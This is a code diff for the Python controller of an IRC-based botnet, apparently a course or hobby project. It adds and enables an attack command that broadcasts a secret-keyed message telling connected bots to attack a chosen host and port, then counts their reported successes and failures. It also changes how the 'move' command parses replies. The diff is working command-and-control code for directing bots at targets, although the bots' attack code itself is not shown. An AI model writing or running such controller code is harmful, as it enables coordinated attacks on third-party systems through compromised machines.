@@ -91,6 +91,41 @@ def status(s):
         bot_string += bot + " "
     print(bot_string)
 
+def attack(s,host,port):
+    atk_s=0
+    atk_f=0
+
+    msg = "PRIVMSG " + CHAN + " :" + secret + " attack "+host+" "+port+"\r\n"
+
+    s.send(msg.encode('utf-8'))
+    print("waiting for bots to respond...")
+    time.sleep(5)
+    print("done sleeping")
+    recvd_lines = s.recv(1024).decode('utf-8')  # this buffer size may need to change
+    lines = recvd_lines.split('\n')
+    for line in lines:
+        if not line:
+            continue
+        try:
+            prefix, command, args = parsemsg(line)
+            args = args[1].split()
+            print("prefix: %s\ncommand : %s\nargs : %s" % (prefix, command, args))
+            if command != "PRIVMSG" or args[0] != secret:
+                continue
+
+            if args[1] != "attack":  # this part is separate just in case other lines don't have an args[1], causing an out of bounds error
+                continue
+            if args[2] == "True":
+                print(args[3]+": attack successful")
+                atk_s+=1
+            else:
+                print(args[3] + ": attack failed")
+                atk_f+=1
+
+        except:
+            continue
+    print("Total: "+str(atk_s)+" successful, "+str(atk_f)+" unsuccessful")
+
 def move(s, hostname, newport, channel):
     counter = 0
 
@@ -107,7 +142,12 @@ def move(s, hostname, newport, channel):
         if not line:
             continue
         prefix, command, args = parsemsg(line)
-        args = args[1].split()
+        print(args)
+        try:
+            args = args[1].split()
+        except:
+            #bot quit, not PRIVMSG
+            continue
         if command != "PRIVMSG" or args[0] != secret:
             continue
 
@@ -192,7 +232,7 @@ def parsecmd(c, s):
         status(s)
         return 0
     elif command[0] == "attack":
-        #attack(s, command[1], command[2]) # we may want to check to see number of args is correct
+        attack(s, command[1], command[2]) # we may want to check to see number of args is correct
         return 0
     elif command[0] == "move":
         move(s, command[1], command[2], command[3])
